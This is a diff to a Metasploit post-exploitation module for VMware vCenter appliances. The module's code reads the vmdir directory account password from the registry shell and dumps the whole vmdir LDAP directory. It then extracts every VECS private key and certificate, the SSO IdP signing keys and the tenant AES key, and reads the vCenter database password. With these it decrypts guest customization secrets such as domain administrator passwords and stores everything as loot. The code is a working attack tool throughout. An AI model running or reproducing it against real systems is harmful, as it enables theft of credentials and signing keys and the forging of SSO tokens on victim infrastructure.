@@ -89,22 +89,22 @@ class MetasploitModule < Msf::Post
   end
 
   def vmdir_init
+    @keystore = {}
+
     vsphere_machine_id = cmd_exec('/usr/lib/vmware-vmafd/bin/vmafd-cli get-machine-id --server-name localhost')
-    if validate_uuid(vsphere_machine_id)
-      vprint_status("vSphere Machine ID: #{vsphere_machine_id}")
-    else
+    unless validate_uuid(vsphere_machine_id)
       fail_with(Msf::Exploit::Failure::Unknown, 'Invalid vSphere PSC Machine UUID returned from vmafd-cli')
     end
+    vprint_status("vSphere Machine ID: #{vsphere_machine_id}")
 
     vsphere_machine_hostname = cmd_exec('hostname')
     @vcenter_fqdn = vsphere_machine_hostname
 
     vsphere_machine_ipv4 = cmd_exec('ifconfig | grep eth0 -A1 | grep "inet addr" | awk -F \':\' \'{print $2}\' | awk -F \' \' \'{print $1}\'')
-    if validate_ipv4(vsphere_machine_ipv4)
-      print_status("vSphere Hostname and IPv4: #{@vcenter_fqdn} [#{vsphere_machine_ipv4}]")
-    else
-      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vCenter eth0 IPv4!')
+    unless validate_ipv4(vsphere_machine_ipv4)
+      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vCenter eth0 IPv4')
     end
+    print_status("vSphere Hostname and IPv4: #{@vcenter_fqdn} [#{vsphere_machine_ipv4}]")
 
     vsphere_domain_name = cmd_exec('/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmafd\Parameters]\'|grep DomainName|awk \'{print $4}\'|tr -d \'"\'')
     unless validate_fqdn(vsphere_domain_name)
@@ -128,13 +128,14 @@ class MetasploitModule < Msf::Post
     @bind_dn = vsphere_domain_dc_dn
     print_good("vSphere SSO DC DN: #{@bind_dn}")
 
-    @bind_pw = cmd_exec('printf $(/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmdir]\'|grep dcAccountPassword|awk \'{print $4}\'|cut -c2-|rev|cut -c2-|rev)')
+    @bind_pw = cmd_exec('echo $(/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmdir]\'|grep dcAccountPassword |awk -F \'REG_SZ\' \'{print $2}\')')
     unless @bind_pw
       fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vmdir dcAccountPassword from lwregshell')
     end
 
+    @bind_pw = @bind_pw[1..@bind_pw.length - 2]
     print_good("vSphere SSO DC PW: #{@bind_pw}")
-    @shell_bind_pw = @bind_pw.gsub('"', '\"')
+    @shell_bind_pw = "'#{@bind_pw.gsub('\"', '"').gsub("'") { "\\'" }}'"
 
     extra_service_data = {
       address: Rex::Socket.getaddress(rhost),
@@ -164,11 +165,12 @@ class MetasploitModule < Msf::Post
     #       much better way. I would also love to lose the ARTIFACTS_ON_DISK
     #       side effect.
     print_status('Dumping vmdir schema to LDIF ...')
-    shell_cmd = "/opt/likewise/bin/ldapsearch -b '#{@base_dn}' -s sub -D '#{@bind_dn}' -w $(echo \"#{@shell_bind_pw}\")  \* \+ \- \> #{temp_ldif_file}"
+    shell_cmd = "/opt/likewise/bin/ldapsearch -b '#{@base_dn}' -s sub -D '#{@bind_dn}' -w #{@shell_bind_pw} \\* \\+ \\- \> #{temp_ldif_file}"
+    vprint_status("shell_cmd: #{shell_cmd}")
     cmd_exec(shell_cmd)
 
     vprint_status("Copying LDF from remote folder #{temp_ldif_file} to loot ...")
-    vmdir_ldif = read_file(temp_ldif_file).gsub("\n\n", "\n").strip
+    vmdir_ldif = read_file(temp_ldif_file).gsub(/^$\n/, '')
     p = store_loot('vmdir', 'LDIF', rhost, vmdir_ldif, 'vmdir.ldif', 'vCenter vmdir LDIF dump')
     print_good("LDIF Dump: #{p}")
 
@@ -197,28 +199,41 @@ class MetasploitModule < Msf::Post
   def vmafd_dump
     get_vmca_cert
     get_idp_cert
+    shell_cmd = '/usr/lib/vmware-vmafd/bin/vecs-cli store list'
+    vecs_stores = cmd_exec(shell_cmd).split("\n")
 
-    vecs_targets = [
-      [ 'MACHINE_SSL_CERT', '__MACHINE_CERT', 'ssl' ],
-      [ 'data-encipherment', 'data-encipherment', 'data' ],
-      [ 'vsphere-webclient', 'vsphere-webclient', 'webclient' ],
-      [ 'vpxd', 'vpxd', 'vpxd' ],
-      [ 'vpxd-extension', 'vpxd-extension', 'vpxdext' ]
-    ]
+    vecs_stores.each do |vecs_store|
+      shell_cmd = "/usr/lib/vmware-vmafd/bin/vecs-cli entry list --store #{vecs_store} | grep 'Entry type :' | awk -F ':' '{print $2}' | tr -d \"\t\""
+      vecs_entry_type = cmd_exec(shell_cmd).to_s.downcase
+      next unless vecs_entry_type == 'private key'
 
-    vecs_targets.each do |target|
-      next unless (entry_key = get_vecs_entry('getkey', target[0], target[1], target[2]))
-      next unless (entry_cert = get_vecs_entry('getcert', target[0], target[1], target[2]))
+      shell_cmd = "/usr/lib/vmware-vmafd/bin/vecs-cli entry list --store #{vecs_store} | grep 'Alias :' | awk -F ':' '{print $2}' | tr -d \"\t\""
+      next unless (vecs_entry_alias = cmd_exec(shell_cmd))
 
-      unless entry_cert.check_private_key(entry_key)
-        fail_with(Msf::Exploit::Failure::Unknown, "#{target.upcase} certificate and private key mismatch!")
-      end
-
-      case target[0].downcase
-      when 'data-encipherment'
-        @vc_cipher_key = entry_key
-      end
+      get_vecs_entry(vecs_store, vecs_entry_alias)
     end
+  end
+
+  def get_vecs_entry(store_name, entry_alias)
+    store_label = store_name.upcase
+
+    vprint_status("Extract #{store_label} key ...")
+    key_b64 = cmd_exec("/usr/lib/vmware-vmafd/bin/vecs-cli entry getkey --store #{store_name} --alias #{entry_alias}")
+    unless (key = OpenSSL::PKey::RSA.new(key_b64))
+      fail_with(Msf::Exploit::Failure::Unknown, "Could not extract #{store_label} private key")
+    end
+    p = store_loot(entry_alias, 'PEM', rhost, key.to_pem.to_s, "#{store_label}.key", "vCenter #{store_label} Private Key")
+    print_good("#{store_label} key: #{p}")
+
+    vprint_status("Extract #{store_label} cert ...")
+    cert_b64 = cmd_exec("/usr/lib/vmware-vmafd/bin/vecs-cli entry getcert --store #{store_name} --alias #{entry_alias}")
+    unless (cert = OpenSSL::X509::Certificate.new(cert_b64))
+      fail_with(Msf::Exploit::Failure::Unknown, "Could not extract #{store_label} certificate")
+    end
+    p = store_loot(entry_alias, 'PEM', rhost, cert.to_pem.to_s, "#{store_label}.pem", "vCenter #{store_label} Certificate")
+    print_good("#{store_label} cert: #{p}")
+
+    update_keystore(cert, key)
   end
 
   def get_vmca_cert
@@ -245,6 +260,8 @@ class MetasploitModule < Msf::Post
 
     p = store_loot('vmca', 'PEM', rhost, vmca_cert, 'VMCA_ROOT.pem', 'vCenter VMCA root CA certificate')
     print_good("VMCA_ROOT cert: #{p}")
+
+    update_keystore(vmca_cert, vmca_key)
   end
 
   # Shamelessly borrowed from vmware_vcenter_vmdir_ldap.rb
@@ -319,7 +336,7 @@ class MetasploitModule < Msf::Post
       # On vCenter 7.x instances the tenant AES key was always Base64 encoded vs. plaintext, and vmwSTSPassword was missing from the LDIF dump.
       # It appears that vCenter 7.x does not return vmwSTSPassword even with appropriate LDAP flags - this is not like prior versions.
       # The data can still be extracted directly with ldapsearch syntax below which works in all versions, but is a PITA.
-      shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{@shell_bind_pw}\" \"(&(objectClass=vmwSTSIdentityStore)(vmwSTSConnectionStrings=#{sso_conn_str}))\" \"vmwSTSPassword\" | awk -F 'vmwSTSPassword: ' '{print $2}'"
+      shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(&(objectClass=vmwSTSIdentityStore)(vmwSTSConnectionStrings=#{sso_conn_str}))\" \"vmwSTSPassword\" | awk -F 'vmwSTSPassword: ' '{print $2}'"
 
       vmdir_user_sso_pass = cmd_exec(shell_cmd).split("\n").last
       sso_pass = tenant_aes_decrypt(vmdir_user_sso_pass)
@@ -352,24 +369,25 @@ class MetasploitModule < Msf::Post
   def get_tenant_aes_key
     # https://github.com/vmware/lightwave/blob/master/vmidentity/install/src/main/java/com/vmware/identity/installer/SystemDomainAdminUpdateUtils.java#L72-L78
     print_status('Extract vmdird tenant AES encryption keys ...')
-    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{@shell_bind_pw}\" \"(objectClass=vmwSTSTenant)\" vmwSTSTenantKey"
-
+    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectClass=vmwSTSTenant)\" vmwSTSTenantKey"
     tenant_key = cmd_exec(shell_cmd).split("\n").last
 
     unless tenant_key.include? 'vmwSTSTenantKey'
       fail_with(Msf::Exploit::Failure::Unknown, 'Error extracting tenant AES encryption key')
     end
 
-    @vc_tenant_aes_key = tenant_key.split(': ').last.encode('iso-8859-1')
-    case @vc_tenant_aes_key.length
+    tenant_aes_key = tenant_key.split(': ').last.encode('iso-8859-1')
+    case tenant_aes_key.length
     when 16
-      vprint_status("vCenter returned a plaintext AES key: #{@vc_tenant_aes_key}")
+      @vc_tenant_aes_key = tenant_aes_key
       @vc_tenant_aes_key_hex = "0x#{@vc_tenant_aes_key.unpack('H*').first}"
+      vprint_status("vCenter returned a plaintext AES key: #{tenant_aes_key}")
     when 24
-      vprint_status("vCenter returned a Base64 AES key: #{@vc_tenant_aes_key}")
-      @vc_tenant_aes_key_hex = "0x#{Base64.strict_decode64(@vc_tenant_aes_key).unpack('H*').first}"
+      @vc_tenant_aes_key = Base64.strict_decode64(tenant_aes_key)
+      @vc_tenant_aes_key_hex = "0x#{Base64.strict_decode64(tenant_aes_key).unpack('H*').first}"
+      vprint_status("vCenter returned a Base64 AES key: #{tenant_aes_key}")
     else
-      fail_with(Msf::Exploit::Failure::Unknown, "Invalid tenant AES encryption key size - expecting 16 or 24 bytes, got #{@vc_tenant_aes_key.length}")
+      fail_with(Msf::Exploit::Failure::Unknown, "Invalid tenant AES encryption key size - expecting 16 raw bytes or 24 Base64 bytes, got #{tenant_aes_key.length}")
     end
 
     print_good("vSphere Tenant AES encryption key: #{@vc_tenant_aes_key} hex: #{@vc_tenant_aes_key_hex}")
@@ -395,43 +413,60 @@ class MetasploitModule < Msf::Post
     decipher = OpenSSL::Cipher.new('aes-128-ecb')
     decipher.decrypt
     decipher.padding = 0
-
-    case @vc_tenant_aes_key.length
-    when 16
-      decipher.key = @vc_tenant_aes_key
-    when 24
-      decipher.key = Base64.strict_decode64(@vc_tenant_aes_key)
-    else
-      fail_with(Msf::Exploit::Failure::Unknown, "Invalid tenant AES encryption key size - expecting 16 or 24 bytes, got #{@vc_tenant_aes_key.length}")
-    end
+    decipher.key = @vc_tenant_aes_key
     (decipher.update(ciphertext) + decipher.final).delete("\000")
+  end
+
+  def update_keystore(public, private)
+    cert = OpenSSL::X509::Certificate.new(public)
+    key = OpenSSL::PKey::RSA.new(private)
+    cert_thumbprint = OpenSSL::Digest::SHA1.new(cert.to_der).to_s
+    @keystore[cert_thumbprint] = key
   end
 
   def get_idp_cert
     vprint_status('Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP ...')
 
-    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{@shell_bind_pw}\" \"(objectclass=vmwSTSTenantCredential)\" vmwSTSPrivateKey | awk '/vmwSTSPrivateKey/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/vmwSTSPrivateKey::/\\n/g'"
+    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectclass=vmwSTSTenantCredential)\" vmwSTSPrivateKey | awk '/vmwSTSPrivateKey/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/vmwSTSPrivateKey::/\\n/g'"
 
     idp_keys = []
+    idp_certs = []
+
     idp_key = cmd_exec(shell_cmd).strip!
-    keycol = "#{idp_key}\n"
-    keycol.each_line do |line|
-      b64formatted = line.scan(/.{1,64}/).join("\n")
-      idp_key_b64 = "-----BEGIN PRIVATE KEY-----\n#{b64formatted}\n-----END PRIVATE KEY-----"
+    if idp_key
+      keycol = "#{idp_key}\n"
+      keycol.each_line do |keyline|
+        b64formatted = keyline.scan(/.{1,64}/).join("\n")
+        idp_key_b64 = "-----BEGIN PRIVATE KEY-----\n#{b64formatted}\n-----END PRIVATE KEY-----"
+        unless (privkey = OpenSSL::PKey::RSA.new(idp_key_b64))
+          fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate private key')
+        end
+        idp_keys << privkey
+        shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectclass=vmwSTSTenantCredential)\" userCertificate | awk '/userCertificate/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/userCertificate::/\\n/g'"
+        idp_chain = cmd_exec(shell_cmd).strip!
+        certcol = "#{idp_chain}\n"
+        certcol.each_line do |certline|
+          b64formatted = certline.scan(/.{1,64}/).join("\n")
+          idp_cert_b64 = "-----BEGIN CERTIFICATE-----\n#{b64formatted}\n-----END CERTIFICATE-----"
+          unless (idp_cert = OpenSSL::X509::Certificate.new(idp_cert_b64))
+            fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate chain')
+          end
+          idp_certs << idp_cert
+        end
+      end
+    else
+      print_warning('vmwSTSPrivateKey was not found in vmdir, checking for legacy ssoserverSign key PEM files ...')
+      unless file_exist?('/etc/vmware-sso/keys/ssoserverSign.key') && file_exist?('/etc/vmware-sso/keys/ssoserverSign.crt')
+        fail_with(Msf::Exploit::Failure::Unknown, 'Could not locate IdP keypair')
+      end
+      shell_cmd = 'cat /etc/vmware-sso/keys/ssoserverSign.key'
+      idp_key_b64 = cmd_exec(shell_cmd)
       unless (privkey = OpenSSL::PKey::RSA.new(idp_key_b64))
         fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate private key')
       end
       idp_keys << privkey
-    end
-
-    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{@shell_bind_pw}\" \"(objectclass=vmwSTSTenantCredential)\" userCertificate | awk '/userCertificate/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/userCertificate::/\\n/g'"
-
-    idp_certs = []
-    idp_chain = cmd_exec(shell_cmd).strip!
-    certcol = "#{idp_chain}\n"
-    certcol.each_line do |line|
-      b64formatted = line.scan(/.{1,64}/).join("\n")
-      idp_cert_b64 = "-----BEGIN CERTIFICATE-----\n#{b64formatted}\n-----END CERTIFICATE-----"
+      shell_cmd = 'cat /etc/vmware-sso/keys/ssoserverSign.crt'
+      idp_cert_b64 = cmd_exec(shell_cmd)
       unless (idp_cert = OpenSSL::X509::Certificate.new(idp_cert_b64))
         fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate chain')
       end
@@ -461,7 +496,7 @@ class MetasploitModule < Msf::Post
         if validate_sts_cert(sts_cert)
           vprint_status('Validated vSphere SSO IdP certificate against vSphere IDM tenant certificate')
         else # Query IDM to compare our extracted cert with the IDM advertised cert
-          fail_with(Msf::Exploit::Failure::Unknown, 'Could not reconsile vmdir STS IdP cert chain with cert chain advertised by IDM')
+          print_warning('Could not reconcile vmdir STS IdP cert chain with cert chain advertised by IDM - this credential may not work')
         end
         sts_pem = "#{sts_key}#{sts_cert}"
       end
@@ -476,37 +511,12 @@ class MetasploitModule < Msf::Post
 
     p = store_loot('idp', 'PEM', rhost, sts_cert, 'SSO_STS_IDP.pem', 'vCenter SSO IdP certificate')
     print_good("SSO_STS_IDP cert: #{p}")
-  end
 
-  def get_vecs_entry(entry_type, store_name, entry_alias, loot_alias)
-    store_label = store_name.upcase
-
-    case entry_type.downcase
-    when 'getkey'
-      vprint_status("Extract #{store_label} key ...")
-      key_b64 = cmd_exec("/usr/lib/vmware-vmafd/bin/vecs-cli entry getkey --store #{store_name} --alias #{entry_alias}")
-      unless (key = OpenSSL::PKey::RSA.new(key_b64))
-        fail_with(Msf::Exploit::Failure::Unknown, "Could not extract #{store_label} private key")
-      end
-      p = store_loot(loot_alias, 'PEM', rhost, key.to_pem.to_s, "#{store_label}.key", "vCenter #{store_label} Private Key")
-      print_good("#{store_label} key: #{p}")
-      return key
-    when 'getcert'
-      vprint_status("Extract #{store_label} cert ...")
-      cert_b64 = cmd_exec("/usr/lib/vmware-vmafd/bin/vecs-cli entry getcert --store #{store_name} --alias #{entry_alias}")
-      unless (cert = OpenSSL::X509::Certificate.new(cert_b64))
-        fail_with(Msf::Exploit::Failure::Unknown, "Could not extract #{store_label} certificate")
-      end
-      p = store_loot(loot_alias, 'PEM', rhost, cert.to_pem.to_s, "#{store_label}.pem", "vCenter #{store_label} Certificate")
-      print_good("#{store_label} cert: #{p}")
-      return cert
-    else
-      fail_with(Msf::Exploit::Failure::BadConfig, "Invalid vecs-cli directive: #{entry_type.downcase}")
-    end
+    update_keystore(sts_cert, sts_key)
   end
 
   def enum_vm_cust_spec
-    shell_cmd = "export PGPASSWORD='#{@vcdb_pass}'; psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c 'SELECT DISTINCT name FROM vpx_customization_spec;' -P pager -A -t"
+    shell_cmd = "export PGPASSWORD=#{@shell_vcdb_pass}; /opt/vmware/vpostgres/current/bin/psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c 'SELECT DISTINCT name FROM vpx_customization_spec;' -P pager -A -t"
     vpx_customization_specs = cmd_exec(shell_cmd).split("\n")
 
     unless vpx_customization_specs.first
@@ -515,9 +525,9 @@ class MetasploitModule < Msf::Post
     end
 
     vpx_customization_specs.each do |spec|
-      vprint_status("Processing vpx_customization_spec '#{spec}' ...")
+      print_status("Processing vpx_customization_spec '#{spec}' ...")
 
-      shell_cmd = "export PGPASSWORD='#{@vcdb_pass}'; psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c \"SELECT body FROM vpx_customization_spec WHERE name = '#{spec}\';\" -P pager -A -t"
+      shell_cmd = "export PGPASSWORD=#{@shell_vcdb_pass}; /opt/vmware/vpostgres/current/bin/psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c \"SELECT body FROM vpx_customization_spec WHERE name = '#{spec}\';\" -P pager -A -t"
       xml = cmd_exec(shell_cmd).to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')
 
       xmldoc = Nokogiri::XML(xml) do |config|
@@ -537,17 +547,33 @@ class MetasploitModule < Msf::Post
       enc_cert_der = []
       der_idx = 0
 
-      vprint_status('Validating DATA-ENCIPHERMENT key ...')
+      print_status('Validating data encipherment key ...')
       while der_idx <= enc_cert_len - 1
         enc_cert_der << xmldoc.at_xpath("/ConfigRoot/encryptionKey/e[@id=#{der_idx}]").text.to_i
         der_idx += 1
       end
 
       enc_cert = OpenSSL::X509::Certificate.new(enc_cert_der.pack('C*'))
-      unless enc_cert.check_private_key(@vc_cipher_key)
-        print_error("DATA-ENCIPHERMENT private key not associated with public key for VM Guest Customization Template '#{spec}'")
+      enc_cert_thumbprint = OpenSSL::Digest::SHA1.new(enc_cert.to_der).to_s
+      vprint_status("Secrets for '#{spec}' were encrypted using public certificate with SHA1 digest #{enc_cert_thumbprint}")
+
+      unless (enc_keystore_entry = @keystore[enc_cert_thumbprint])
+        print_warning('Could not associate encryption public key with any of the private keys extracted from vCenter, skipping')
         next
       end
+
+      unless (vc_cipher_key = OpenSSL::PKey::RSA.new(enc_keystore_entry))
+        print_error("Could not access private key for VM Guest Customization Template '#{spec}', cannot decrypt")
+        next
+      end
+
+      unless enc_cert.check_private_key(vc_cipher_key)
+        print_error("vCenter private key does not associate with public key for VM Guest Customization Template '#{spec}', cannot decrypt")
+        next
+      end
+
+      key_digest = OpenSSL::Digest::SHA1.new(vc_cipher_key.to_der).to_s
+      vprint_status("Decrypt using #{vc_cipher_key.n.num_bits}-bit #{vc_cipher_key.oid} SHA1: #{key_digest}")
 
       # Check for static local machine password
       if (sysprep_element_unattend = xmldoc.at_xpath('/ConfigRoot/identity/guiUnattended'))
@@ -561,7 +587,7 @@ class MetasploitModule < Msf::Post
         when 'false'
           secret_ciphertext = sysprep_element_unattend.xpath('//guiUnattended/password/value').text
           ciphertext_bytes = Base64.strict_decode64(secret_ciphertext.to_s).reverse
-          secret_plaintext = @vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
+          secret_plaintext = vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
         else
           print_error("Malformed XML received from vCenter for VM Guest Customization Template '#{spec}'")
           next
@@ -598,7 +624,7 @@ class MetasploitModule < Msf::Post
       when 'false'
         secret_ciphertext = sysprep_element_unattend.xpath('//identification/domainAdminPassword/value').text
         ciphertext_bytes = Base64.strict_decode64(secret_ciphertext.to_s).reverse
-        secret_plaintext = @vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
+        secret_plaintext = vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
       else
         print_error("Malformed XML received from vCenter for VM Guest Customization Template '#{spec}'")
         next
@@ -625,15 +651,20 @@ class MetasploitModule < Msf::Post
   end
 
   def get_db_creds
+    unless file_exist?('/etc/vmware-vpx/vcdb.properties')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /etc/vmware-vpx/vcdb.properties')
+    end
+
     shell_cmd = "cat /etc/vmware-vpx/vcdb.properties | grep jdbc:postgresql:// | awk -F '/' '{print $4}' | awk -F '?' '{print $1}'"
     @vcdb_name = cmd_exec(shell_cmd)
 
     shell_cmd = "cat /etc/vmware-vpx/vcdb.properties | grep username | awk -F '=' '{print $2}'| tr -d ' '"
     @vcdb_user = cmd_exec(shell_cmd)
 
-    shell_cmd = "cat /etc/vmware-vpx/vcdb.properties | grep password | grep -v encrypted | awk -F '=' '{print $2}'| tr -d ' '"
+    shell_cmd = 'cat /etc/vmware-vpx/vcdb.properties | grep password | grep -v encrypted | cut -c 12-'
     @vcdb_pass = cmd_exec(shell_cmd)
 
+    @shell_vcdb_pass = "'#{@vcdb_pass.gsub("'") { "\\'" }}'"
     print_good("VCDB Name: #{@vcdb_name} User: #{@vcdb_user} PW: #{@vcdb_pass}")
 
     extra_service_data = {
@@ -690,6 +721,11 @@ class MetasploitModule < Msf::Post
 
     idm_cmd = cmd_exec("curl -f -s http://localhost:7080/idm/tenant/#{@base_fqdn}/certificates?scope=TENANT")
 
+    unless idm_cmd != ''
+      print_error('Unable to query IDM tenant information, cannot validate ssoserverSign certificate against IDM')
+      return false
+    end
+
     if (idm_json = JSON.parse(idm_cmd).first)
       idm_json['certificates'].each do |idm|
         unless (cert_verify = OpenSSL::X509::Certificate.new(idm['encoded']))
@@ -722,6 +758,14 @@ class MetasploitModule < Msf::Post
 
     unless command_exists?('/opt/likewise/bin/lwregshell')
       fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find lwregshell (is this host a vCenter appliance?)')
+    end
+
+    unless command_exists?('/opt/likewise/bin/ldapsearch')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find likewise ldapsearch')
+    end
+
+    unless command_exists?('/opt/vmware/vpostgres/current/bin/psql')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find psql')
     end
   end
 
